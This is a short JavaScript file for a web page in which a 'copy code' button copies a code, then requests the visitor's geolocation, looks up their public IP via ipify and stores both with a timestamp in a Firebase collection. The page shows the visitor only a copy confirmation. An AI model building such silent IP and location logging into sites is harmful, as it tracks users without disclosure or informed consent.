import { db } from "./firebase-config.js";
import { collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

document.addEventListener("DOMContentLoaded", () => {
  const codigoEl = document.getElementById("codigoid");
  const btn = document.querySelector(".button a");

  btn.addEventListener("click", async () => {
    const codigo = codigoEl.innerText;
    const clickSound = document.getElementById("clickSound");

    try {
      await navigator.clipboard.writeText(codigo);
      showToast("Código copiado!");

      // Toca som
      clickSound.currentTime = 0;
      clickSound.play().catch(() => {});

      // Captura geolocalização
      let location = {};
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            location = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude
            };
            salvarDados(codigo, location);
          },
          () => salvarDados(codigo, null),
          { timeout: 5000 }
        );
      } else {
        salvarDados(codigo, null);
      }
    } catch (err) {
      console.error("Erro ao copiar:", err);
    }
  });
});

function showToast(msg) {
  const toast = document.getElementById("toast");
  toast.innerText = msg;
  toast.classList.add("show");
  setTimeout(() => toast.classList.remove("show"), 2000);
}

async function salvarDados(codigo, location) {
  try {
    const ip = await (await fetch("https://api.ipify.org?format=json")).json();

    await addDoc(collection(db, "acessos"), {
      codigo,
      ip: ip.ip,
      location,
      timestamp: new Date().toISOString()
    });

  } catch (err) {
    console.error("Erro ao salvar no Firebase:", err);
  }
}
